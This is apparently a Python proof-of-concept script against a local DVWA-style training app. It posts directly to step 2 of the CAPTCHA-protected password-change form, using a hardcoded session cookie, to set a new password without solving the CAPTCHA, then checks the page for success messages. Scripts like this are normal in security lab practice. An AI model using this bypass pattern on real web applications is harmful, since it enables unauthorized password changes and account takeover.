import urllib.request
import urllib.parse

url = 'http://127.0.0.1:8080/vulnerabilities/captcha/'
data = urllib.parse.urlencode({
    'step': '2',
    'password_new': 'bypass789',
    'password_conf': 'bypass789',
    'Change': 'Change'
}).encode()

req = urllib.request.Request(url, data=data, method='POST')
req.add_header('Cookie', 'PHPSESSID=9kk32r8pdi340ch33to4hbg0s2; security=low')
req.add_header('Content-Type', 'application/x-www-form-urlencoded')

try:
    resp = urllib.request.urlopen(req)
    content = resp.read().decode('utf-8', errors='replace')
    print("STATUS:", resp.status)
    print("BODY LENGTH:", len(content))
    
    # Check for specific strings
    if 'Password Changed' in content:
        print("FOUND: Password Changed")
        idx = content.index('Password Changed')
        print("Context:", content[idx-100:idx+200])
    elif 'Passwords did not match' in content:
        print("FOUND: Passwords did not match")
    elif 'CAPTCHA was incorrect' in content:
        print("FOUND: CAPTCHA was incorrect")
    elif 'You passed the CAPTCHA' in content:
        print("FOUND: You passed the CAPTCHA")
    else:
        print("No expected strings found")
        # Show the part between vulnerable_code_area tags
        import re
        matches = re.findall(r'vulnerable_code_area.*?(?:<pre>.*?</pre>)?.*?vulnerable_code_area', content, re.DOTALL)
        if matches:
            print("AREA:", matches[0][:500])
except Exception as e:
    print("ERROR:", e)
